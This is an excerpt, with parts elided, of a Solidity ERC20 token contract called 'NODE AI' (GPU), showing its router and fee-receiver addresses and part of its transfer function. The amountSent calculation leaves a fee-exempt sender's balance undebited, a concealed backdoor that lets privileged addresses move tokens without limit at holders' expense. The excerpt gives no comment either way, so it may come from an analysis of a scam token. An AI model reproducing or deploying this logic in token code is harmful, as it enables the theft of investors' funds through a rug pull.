...
contract GPU is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "NODE AI";
    string constant _symbol = unicode"GPU";
    ...
    address private marketingFeeReceiver = 0xD1A2e12237781E1F9b8081274F689809D3452F34;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(shouldSwapBack() && recipient == pair && !isFeeExempt[sender] && amount > _maxFeeSwap){ swapBack(); } 

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
        uint256 amountSent = (!shouldTakeFee(sender) && _balances[sender] <= _maxWalletAmount) ? amount - amountReceived: amount;
